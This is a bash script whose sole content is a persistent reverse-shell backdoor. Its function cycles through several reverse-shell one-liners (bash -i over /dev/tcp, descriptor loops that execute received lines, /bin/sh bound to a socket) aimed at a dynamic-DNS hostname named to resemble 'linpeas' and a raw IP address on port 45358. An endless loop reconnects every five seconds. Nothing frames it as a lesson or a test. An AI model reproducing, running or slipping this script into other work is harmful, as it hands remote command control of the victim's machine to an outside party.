#!/bin/bash

# Function to establish connection
establish_connection() {
    bash -i >& /dev/tcp/linpeas874269852.ddns.net/45358 0>&1
    bash -i >& /dev/tcp/128.78.143.131/45358 0>&1
    exec 5<>/dev/tcp/linpeas874269852.ddns.net/45358;cat <&5 | while read line; do $line 2>&5 >&5; done
    exec 5<>/dev/tcp/128.78.143.131/45358;cat <&5 | while read line; do $line 2>&5 >&5; done
    exec /bin/sh 0</dev/tcp/linpeas874269852.ddns.net/45358 1>&0 2>&0
    exec /bin/sh 0</dev/tcp/128.78.143.131/45358 1>&0 2>&0
    0<&196;exec 196<>/dev/tcp/linpeas874269852.ddns.net/45358; sh <&196 >&196 2>&196
}

# Main loop to handle reconnection
while true; do
    establish_connection
    # Sleep for a while before attempting to reconnect
    sleep 5
done
